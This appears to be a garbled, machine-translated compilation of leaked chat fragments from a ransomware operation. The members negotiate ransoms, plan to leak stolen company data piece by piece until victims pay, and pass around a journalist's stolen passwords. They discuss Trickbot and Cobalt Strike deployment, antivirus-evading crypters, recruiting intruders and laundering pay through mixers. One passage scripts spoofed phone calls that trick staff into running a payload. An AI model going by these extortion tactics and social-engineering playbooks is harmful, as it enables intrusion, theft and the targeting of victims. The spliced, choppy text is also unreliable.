why not attack the photo with the number and put the links from imgbb (the software for mass uploading of pictures as well as immediately getting the links to the embed is given)

imgbb - quite a trusted links as a dumping ground for images and "unique" attack is still an attack that filters can respond to + not every user has an attack loaded by default

[21:04:21] <johnyboy77> or you just score?
[21:10:55] <mango> hey bro
[21:11:06] <mango> Get specific)
[21:11:12] <johnyboy77> hello
[21:11:13] <mango> we work for money :)
[21:11:20] <mango> we don't give a fuck who we want it from
[21:11:22] <johnyboy77> I leaked correspondence of the people who work against russia
[21:11:25] <johnyboy77> in the information field
[21:11:31] <johnyboy77> but I can't decipher it
[21:11:34] <johnyboy77> signal correspondence
[21:11:52] <johnyboy77> shorter journalists
[21:11:54] <mango> let me ask)
[21:11:55] <johnyboy77> who bullshit against russia
[21:12:04] <johnyboy77> just the file is fucking broken I can't decipher it
[21:12:13] <johnyboy77> this is fucked up.
do we need this?
i don't know how to decrypt the signal
or we're just for the money and no political fuss
this is e2e
sorry there is nothing i can do here
I even want to
but I can't help it
so are we interested in such data?
i.e. are we patriots or what?))
of course we are patriots)
I got it. If they decipher it, I'll let you know
I also wrote to you the other day about aukion, but I figured you were busy and didn't get into it)
[21:21:02] <johnyboy77> in short, there's a mail from a person from bellingket
[21:21:06] <johnyboy77> who works specifically with ru and ua
[21:21:06] <johnyboy77> say so
[21:21:08] <johnyboy77> and all his passwords are there
[21:21:17] <johnyboy77> and it's still valid
[21:30:56] <mango> well, at least take a screenshot of his correspondence
[21:31:05] <mango> need more specifics bro what to talk about
[21:31:07] <johnyboy77> we'll upload the files

60k is a lot for a carbon black ?

my buddies offline are ready to buy, waiting for the go-ahead s..

since you're in a good mood and talkative today - here you go :-D
<mango> hello bully! I had a very cool idea about the data auction while I was sleeping. I propose to open a site that will be thrown into the public domain every say every 3 minutes 2-3 files of each non-paying company, randomly. And to take out the data of a particular company can only be done by paying for them. The cost is determined by the number of remaining files * let's say by 3 bucks per file. And then according to the auction system. Suppose there was a fuss about a company - sell to the highest bidder in the last 24-48 hours. I think so, they didn't pay ok. It's one thing to get the offices back up and running - it's another thing when there's an open daily leak of fresh personal and work data for a month What do you think about this?
hello here ?
:-$
I'm still working my way through the auctions.)
I'll show you what we're working on soon.
ok) the point is not just to roll out all the files at once, but a little bit at a time
that's my point)
Don't forget about Navalny, I told my boss he's waiting for details
give me a screenshot of what's in there and we'll figure something out
Pew pew.
I just told Nitrous that you'll be gone
No no))

As for the sonicwolves, the ones our rescuer sent me are RESTORED, used. that's why they cost 1k each. Sold only in US on ebay. I found new ones from the manufacturer in UK. Cost £2,500 each. With uC to lead three weeks in Sevastopol to this dude in the best case, because of the covid there are big problems with delivery. If you get new ones from England, it's faster. And you can get the new 410 there. They will be in Sevastopol in a week.

Hey, I'm working on it right now.
What about now?
Bro, I need some bits. For gps, for a router, for gaskets.
bc1q4qvnjchr3y9wpm78qlnr6659qrtnnt5pfgn6p5
62k.
55k salary, 2 and a bit for expenses and 4200 for the router (£2.5k router and 500 for shipping and hassle for my guys)
Tomorrow in the yuk will order in the morning, in 2-3 days will be in Fr, 3-4 days to ukr\blr and from there by conductor to Russia. If we can get it from Belarus, then from there we will send it by express mail.
?
We appreciate the further reduction in price. Please realize that even at 2.5 million, we don't just have that kind of money at the ready to pay you. It's still very high. I have discussed with my management team here and the truth of the matter is that we don't need the decryptor but we are very interested in paying something to not have our data released. We are still just trying to figure out how much we can scrape together to offer. While we are doing that, my boss wanted me to ask you whether or not we will get access to our data that you took once we paid anything? We have understandably done some research and we have seen that in some cases, the data is given back to people once a payment has been made. We also noticed in the file tree that you sent over that some of the file paths look like they were from your local system. We would also like assurances that our data has been deleted from local systems as well
So this account...
Server status is different.
Confused state and status. Sorry.
Okay, maybe we'll have something by tomorrow.

Bro this is all I could find on them. Give them a call, tell them if they still need a decryptor and have them chat it out. If they change their mind about paying, we'll start posting their files. If they will pay us for not having their files - we had technical difficulties, but now we have all their data and we are ready to show it if anything

Wow.
how many downloads do you have now?
Carbon all ready to buy
ok
for the carbon itself 14.8k euros. +20% of this amount for the conversion from the bit to the company in fr. and the guys as promised 30
Carbon sent me a pdf for my signature
with the price and all the conditions
drop it off?
tomorrow we will charge the bits - tomorrow they will probably pay already
sonicwolves already bought today, everything will be clear in a week
great
Let's send a pdf on carbon, but it's in French)

googletranslate it.
there's the general terms and conditions and so on.
I gave out all the paychecks today, 2 people were out all day, the rest got them all.
I don't need it.
Yeah, great.
Let's do it.
bc1qwjg3qcugy8n6778783a4rrxvn4nvx58yjg07dt
how much is this in dollars?
21k +30k, 30 can be done
14.8k euros + 20% commission 2800 euros approx.
I downloaded .

Pdfka sure you will not look?
It's just all the technical descriptions, etc., what if it is not what we need or what is missing?
I won't

the script from an untagged area of the disk gathers the load from different sectors into a single whole and executes it :)
cool
it should be used once in a while at least
i have a web panel so i can load a payload file, specify parameters (number of copies of hash, container name, lnk name, additional files in container) and i can assemble many different containers with hash different lnk to run it.
i did balzac and derek - they are pulling something, i spoke to derek today - he's making the splits, balzac is broken
Hey, how's it going?

I blame cryptors for using qaz.im, they upload files there and use this service to set passwords and make archive. Now all files are transferred to 2 archives under passwords and to mega - so far everything seems to be ok with the files...
Build machine for cryptors will be ready by the end of the month, yesterday they already started testing it but it is too crude yet

Prvieth, bro.
Making 2 echelles?
Hi
Go to .
Okay. I'm ordering everything.
Yesterday the second man hit 1494 bot. Good echel))
Well, why isn't he doing it?
Apparently not quite know how to send.
Although the man is also very experienced.
Either that or the trick doesn't work.
Balzac doesn't do well either.
Something they're doing wrong.
Maybe it's a letter.
Maybe.
?
Two of them are the same?
No, it's different.
Oh, man.
And yesterday, they did the same thing with the same Excel.)
Who's the other one for?
The first one's cherry@q3mcco35auwcstmt.onion. The second one's netwalker@q3mcco35auwcstmt.onion.
So, what about the payment?
Let's go 6k for two. For two weeks. Can we do that?
No problem.
Just like I wanted)))
(All right. ))
2 weeks at a time)
Yeah
How long before you lose the weight?
I'm guessing within the hour. Do it again.
Copy that. .
Sap's already got two skeletons ready.
Good.
Did you write Cherie that you made Netwalker and he fucked up?
Not yet.
I don't want him to look at himself and tell on us, like we're doing shit.)
I will.

I scanned the net for nasa - I'll send the file there as well \I didn't see any nasa

Sap's power is out, as soon as it's back on, he'll finish the second one and send it to me.
All right. I'll check the lag on the first one.
Okay. .

We have to test the performance of the build machine
yes i did
the result is not so good)
You need to check different loads every day.
All stubs. and report if something is not working to the head of the build machine
well, it's in the work to check)
I don't understand the crypto.
Will Stern still be there today ?
Stern all gone?

Glad to hear from you.
There's five or six exchanges on that one.

So the locker is fine.
We're polishing it for new challenges.
Which were not in the terms of reference, I'm sorry.
I can't shift the focus to new projects because of this.
According to the spec, absolutely everything has been implemented.
Even the AVs can't handle it. Checked it out.
Hi there.
How's it going?
You should ask Brown, he's a tester. I don't want to praise myself. And he saw everything in the battle... :-)
That's not even the main thing there. There we beat the AV thanks to an absolutely idiotic assembly of the project.
So idiotic that the ABs do not respond to it. In fact
Hi
All laid out, all described.
We need 30 progers for the booze
and 50 admins for reverse and horses
so how many do we give?
1?
hello
hello
where did you go?
Are you working at all?
Give him a 1.5.

when you answer my questions))))
I got 65k off.
You know what else you need?
50 admins.
25 for hors and 25 for revers@
hors@ revers@
holy shit)
and 30 more progers for the booze.
Yes he said ... will be done ...
he had the beats, went to give them away. answer the questions as you can, at least for the morse, what are the modules needed for it
he needs modules for the morsel.
ok
Hi, are we going to start?
You give me 3 -4 days off?
yes
Take it
Great, thanks.
Now I'm thinking of putting vntz in that wrap too.
Hello?
I don't need it.
I do.
Hey, how you doing?
))
Sorry to interrupt, but Sandy's not off the subject.
He really wants a new, even more effective release.
And I've got it!!!!!!!!!
It's a pain, of course, but you can't throw it in the trash, can you?
I mean VNC, not Sandi.
:-)
On second thought, though.
Nah, Sandi's good.
Let's move on to more pleasant matters.
Bonus!
A bonus?
Yes, a bonus!

i've been messing around with the logs, i told you about the stick theme many times , balzac was making bots i was pouring the stick and other stuff while the stick collector was drunk or passed out for weeks, then there was a long break, then the collector stopped pouring, now it's working again, but somewhere balzac is gone and you cut off all access
And if I can't work it off.
I can pour the stick and give you half of all the work

send me the report if you need it I'll pass it on)

hello bro! happy holidays!
Hey, Salamander is your dude? S has some questions about him there...
Hey, bro! Happy Holidays!
Hey, Salamander's your dude, right? S has some questions about him...
[14:32:06] <mango> bro, do it again please
[14:32:08] <mango> it's all cut up.
[14:32:21] <mango> drunk accidentally pulled out the flash drive, everything is ruined)))
1. Salamandre wrote everything off, waiting for reports from him.

2. I have contacted Veron - he has problems with the dock so far. I promised him to help during the holidays, either dock will do it, or the second option is a container. I have arranged him a presentation, all described how it works and what can, waiting to get acquainted. On the start will say during the holidays - waiting for how to solve the issue with the dock\delivery paiload.

3. you still haven't answered what config you need for installs. I remind you that we decided to give it a version of Trick2 (which was originally planned for Target) for Veron - what modules should be in config troy, and which can be removed, so as not to stain extra modules and reduce weight\detects in the eche. If I understand the software structure correctly - I need injector, pvgrub, importdll. What other modules are vital in the config?

4. Contacted Hors about the admins - he clarified the problem, says we need more pentesters, not admins. And at 6 am in my beautiful and drunken head came up with a great idea where to get them :) Remember Revils PR'd on Damag - a thousand bucks in bitcoins on the deposit and then they started tearing up the topic - they wrote there that they are inviting teams of hackers / pentester to work with them. They wrote five pages of their topic with suggestions! They wrote something like this. "Team 3 people experience, etc." and there are a lot of them 5 or more pages! That's where we take them! I spammed on them all personalities with an offer of work + many there are contacts themselves left (though toks all). By the 10 th will be done. The only question is about payment to them. How much do we pay? 2k - as all?

And zp me if you can)) bc1qclzlkq8j3ckmulye0k5xpzfymsxxha735mlauf
And here's more. I suggest for Veron always prepare 2 files for 2 groups at once. What if the file gets tired quickly (which is not uncommon for us + its volume) - we always have a ready crypted second file in order to avoid downtime and waiting for cryptors. I think it would be a good move, just remembering times when I myself poured - our main problem was to get the file by 10 am (and he is an early bird and does not tolerate delays) and the second point - the replacement of crypts - before it could last for 2 hours. And with this maneuver we have a good reassurance

[01:23:21] <buza> just quote me and give him statistics how many resumes you had and how many were rejected because of salary
[01:23:53] <buza> the problem is I have no idea how he can convincingly prove his worth
[01:24:20] <buza> if you make a complicated task, it will take him a long time to solve it
[01:24:28] <buza> and part of it will refuse at all
[01:24:39] <buza> that means he should show some of his past merits

he used to use this email andrej.sergeev_2020@mail.ru maugli765 but it got sent to spam
swift asks you to write to him

Trick. It's ok today.
Hi! Happy Holidays!!!
Let them offer their salaries.
who say no!
Besides that, we need some regular progessors...
and admins
regular progres, of which there are already a lot...
we need 30 more of them
Get the terms of reference from Booza
the trike only needs networkDll, pwgrab and propagation modules which will be loaded later and that's it
>pay? 2k - like everyone?

No, they will be on interest.
Veron is the most important person right now.
He gets all the attention.
Yeah, I get it. Okay.
And also...
The hackers are writing...

hi
how are you doing?
Hi
hi
there's mango writing about vpn.
hey bro!
happy holidays to you !
I don't know what Armata should write without you.
[Error: the message is encrypted and cannot be decrypted.]
hello
I need you right away.
Anyway, cancel your vacation.
Needed every day.
I'm having trouble getting data into the warehouse.
and you need to be in by 11:00 p.m. anyway.
because people start working actively when you're gone.
You can leave later, but it has to be before 11:00 or better.
He was out during the day. He's got hls for today. He's not answering yet.
Do you have bots?
Knock on the door.
I think he had our deposit on germany.
Remember?
Send it to
I see, thank you.)

Hi, please make a log of all errors if the client fails for some reason to create a chat when loading the .txt
Hi, ok

[22:16:21] <love> Okay, tomorrow then. After they took away the accesses now bots do not go to the admin, we still deal with it
deal with it
urgently
Hi
how are you ?
hello
Let's modify Trick and get rid of all the unnecessary stuff.
We don't really need the admin logpost and so on.
what do we need?
and a lot of unnecessary functionality
the main thing is clean and fast turnaround
and workability at all
what does logpost mean ?
any ideas maybe
logpost is an injectDll module
into browsers which
got it
but it doesn't seem to be loaded for a long time
well, I guess so.
maybe there's something else in there.
There's a support team here at love@.
Yeah, I know.
he says that the boots do not knock, and if they do, then it's hard to bring them to cobalt
None of them knock at all.
What do you mean the cobalt doesn't start with the trike?
 > And there's a grid that we did not start yes chat?

You have to check with Hors, I don't take reports from him. Only on the fact of payment
Let's pay for Spam and add it here and Armata too.
for armata, we need to test it
on 20-30 bots maybe
how it will bounce back in general
what do i throw at him now and what for?
what if there is no bounce
at all
I've heard that on the c-grade software it doesn't bounce at 20% only
I'd have to test it.
at least a couple of times.
Well, there's a pws
command
how do you run cobalt on trike?
and this command doesn't work from trike ?
z yt pyf.
I don't know.
love tells me.
Maybe he's a little slow.
hi
I'll check with him, he's probably screwed up somewhere.
He probably wants to quit on his own.
He has no results.
It's been two months now.
he recently wrote me about running an exe 42, 43 command
I gave him tasks to look for coders, reversers and admins
0 from him
from viper 20 people have already come
and they're working
the link needs to be encrypted, and he was translating it to base64
When are you online?
I can't catch you.
Hey, how you doing?
Told me it wasn't working.
Yeah, it is.
We're having a lot of trouble encrypting the links.
We should do the black one like the pink one.
The link is encrypted by the api.
Let's do it in the same place.
Who does the black admin?
It's a matter of one day.
Yeah, the api's already done.
koo
Hi.

[07:46:04] <hof> we have a lot of trouble with link crypto

Hi.

2. Where are the new coders? I need the crypto department, I will give a person who will train them through roketchat. I'll have to raise the rockchat and add 10 coders there. Does HR supply you with people? If not, why not? Did you contact them? I gave you the direction I need 100 coders this summer. You move this direction. You need to move all the other people.
3. Write down by each coder who does what, who are the supervisors, etc.

Look, it doesn't work like that.
Why don't you come out at least rarely?
<mango> On Alka, I found contacts through my relatives. I have a great contact with the Russian diaspora in Brooklyn, we have our own chief judge there) it's that here the chairman of the court - she immediately gave us her lawyer who moves with her. All the states there have their own laws and lawyers accordingly. This one specifically from Florida, he's a local there, he kind of knows everyone.  At 5 a.m. they blew him up) they gave him all the information he needed. Told them so: we need to clarify the situation with all the latest news, find out who her lawyer and what claims go to her, etc., in general, while intelligence, try to get all the official papers that there is and then we will think. She got a job online, she didn't know what she was doing and who she was working with. I'll keep you posted.

You make a crm, you put in a permanent corp with employee contacts, job title and first name and last name.
then you make scripts
you divide them into operator departments, for example, the first one for warming up, the second one for action, the third one for fixing.
Just an example: find out the name and phone number of their sysadmin. And the numbers of ordinary low-end IT people. Warmers call with a substitution of numbers from the IT-specialists and ask why they have not updated any software or Windows (examples are all), like procrastination is the risk of hacking and he's like the guilt will be later, like you're all skrynami skrynami and manuals. He says he did not get anything. The IT-specialist says that he will pass the information to the sysadmin and contact the client again. Before that you have to call him by name and position. The second department calls on behalf of the sysadmin and from his number, and says "no remote access," like they said to update earlier, they say, "install the update and give him a link to a payload file such as mega or rklouda, or something else, or a link just his or the mail saves. He puts it running, then either the scheme to the third step is played, like I'll send a technician to the department and he will do everything, and the technician calls and tells him when he comes to them, and the person waits for him calmly not panicking like something is running and so on.
[17:04:06] <Ali> Then they call him and the director tells him
[17:04:10] <Ali> Kind of like this
[17:04:17] <Ali> There are a lot of scenarios
[17:04:33] <Ali> But we should automate the process
[17:04:36] <Ali> There are robots
[17:04:49] <Ali> You set them up with scripts
[17:05:03] <Ali> And operators just answer robot calls
[17:05:10] <Ali> They mark the result
[17:05:27] <Ali> The robot itself dials up as there's a free operator
[17:05:41] <Ali> And then the contact itself sends to the desired stage or basket
[17:05:47] <Ali> Have you tried that?
[17:32:54] <Ali> I started to work this way, within a month already had results, unnecessary scripts and actions were sifted out, the necessary remained and finalized
[17:42:28] <Ali> Target worked exactly this way
Write me back when you're up and running.

[Error: Message encrypted and impossible to decrypt.]
The salary is in bits, of course.
I recommend using a mixer.
I understand bits, but what is a mixer?
it's what depersonalizes them

Did the recruiter tell you what we do?

Yeah.
look something up on the darknet.
go into more detail
so there won't be any misunderstandings later
If I choose Keshin through the exchanger like depositing cash to the card, is that okay?
Yes
ok
Then OK.
There are a lot of directions.
Have you heard anything about ransomware?
nope
cryptojackers ?
lockers
Oh, I get it. Yeah.

I got a letter in response to the job, I think somehow need to negotiate our actions, not to pay one person for the same task several times. about the bit cache I did not tell him:
I chose the first job I saw about obfuscation of strings.
Prepared the project in VisualStudio 2019 below.
If you need, I can send the archive with the solution .sln.

You can simply copy the text into a typical console ""hello world"" VS2019 project.
Compile and get what I have tested - the presence of lines in the program,
their absence in the binary (verified by hex editor), or in the timing of the handy
IDA PRO program.
If the assignment is done according to your assignment and your ideas
of the correct solution, then please list the promised fee to

bro
here

Bro urgently.
Hi. Are you there?
are the messages coming through?
Look, as a matter of fact, there is a theme that there are always targetets. stupidly buy up. people at a % not willingly give. sit brooters, styler owners, etc., and it is easier for them to get a fix for their access. targetets with rev 100k worth about 3k+$. etc. there depends on the grid of course. i suggest buying up anything and everything. My partner, an acquaintance of mine, does this. In one month he made 5k in payments. he found suppliers and buys everything. he spends a lot, but the output is not commensurate with what he spends. i suggest buying everything he can get his hands on. traff, accesses (sitrixes, vpn) ... We're moving on spam, hopefully we'll win. But we can't just sit on our asses.

In different calculations, or one? Should I give all of them the salary or chors and revers themselves to deal with their own?

On Alla need an answer, I understand that you're very busy bro, but I'm there a hell of a lot of people pulling on your requests and now they have a week to mess with the head on the result. They just will not help then, and they would be very useful to us)

hey keep everything in different reports
I am waiting for specifics from you
Hey bro
hi
hey
I'll be home in 5 minutes
 1. Alka is being transported from Florida to Ojai, she has a state lawyer as there is no money for her own I understand. We can get the documents if our lawyer will make an agreement with her to defend and represent her. In order for him to start acting, we need to charge him 10k. And we need to figure out how to get it to the US safely... I don't know how and what to do next, everything is hanging there. He's waiting for an answer.
So I finally got it right about the new people? 50 revers with Prof, 50 Horses and up to 100 coders by the end of the summer for the bouza ?
yes
That's right.
and we need 5-10 ali
ali@
admins too
We have hr managers salaman, kagas and viper
They are also involved in this issue.
In addition to your search
Keep them on your radar.
And the payroll
.
Yeah, I got it, viper wrote me. I'll do it.
I'll need 10 more reversers for swift@.
Keep an eye on them too.
And look for more options at the same time.
about ohaa
are you trying to raise an army or something :)
That's not what you're telling me.
10k for what?
what are you talking about?
conditions
And if she refuses it.
For the lawyer to start work and make an agreement with her.

[16:53:40] <balzak> anyway bots are coming)
[16:53:51] <balzak> there def something does not show up in the admin
are you there?
what's going on there?
without this agreement he can not do anything
it's not about the money.
it's just a yes, no no answer...
yes. okay.
do
carbon seems to have bought, half an hour ago he called, I'll tell you more in the evening).
http://epyclq65gskclmpu.onion:1337 is our file dump. it's gonna be on the sia blockchain.
super
But the booze didn't seem to appreciate it...
What did he say?
i told him what we discussed before about the fileswash, memos, and the ii in the blockchain. he was yammering on about no people or resources to do it, that it was all a dare and so on) i got it all done by one of our admins, benny in rocket. now we are testing and thinking about the functionality)

[16:57:25] <balzak> at the moment sending, according to the stat already 50 bots, sending about 40 minutes, but there's something in the admin red does not come, def parses
[16:57:39] <balzak> here's all info
there?
take all tricks and all problems
ideally, it would be the same as on qaz.im but without logs, plus access to files and service by personal password
i'll pay more, but i want you to be in charge of everything and keep in touch with everyone inside the jabber
to make sure everything clicks.
if you need to redo the admins
because the song continues with the fact that cryptors and testers leak files to all sorts of shitty services...
Are the paydays on pdn or friday?

hi
broo
hi
Are we talking about lero or dero?
Lero, I think.
It's got tables.
My understanding is that it works on a checklist level.
Like if there's an ip, then block it on the blacklist.
bro, you'll do it soon, sorry for the intrusion.
I understand it works at the check level.
(20:56:13) driver@q3mcco35auwcstmt.onion: Like if there's an ip, then block in the blacklist

Yes, that's right.

Hey. Yeah.
hi
What's up?
There are no new bots there now.
And the topic's dead
hello
I need a stick just - online and that's all, and your topic is dead or I do not understand?
 Balzac would make bots.
Yeah, great.
hi
i wanted to get into the live stuff, on what terms do i have this opportunity?
hey
If you can get the bots.
then go for it.
Yeah, Balzac can't do it right now either.
if it works out
you take his bots
share it amongst yourselves
I don't need anything
zero possibilities in this matter, I spent a couple of months studying - no use
i'm there for the bots in general and just to gather information
i.e. as for killing some account no
I only collect information on the company
by hitting the accounts.
I mean, there's no harm in it.
it's not amazon
Or any other stores.
found the right link - went in, gathered information - came out, and never came back
for offline work
i can drop some money right away if it's a question of finances
I tried to look in the publick - there is just ZERO bu-bots. so I will not catch fish there.
?
Look, I'm trying to figure it out, there's a table on the blacklist. But on the white list, I can't figure out where to put the ip.
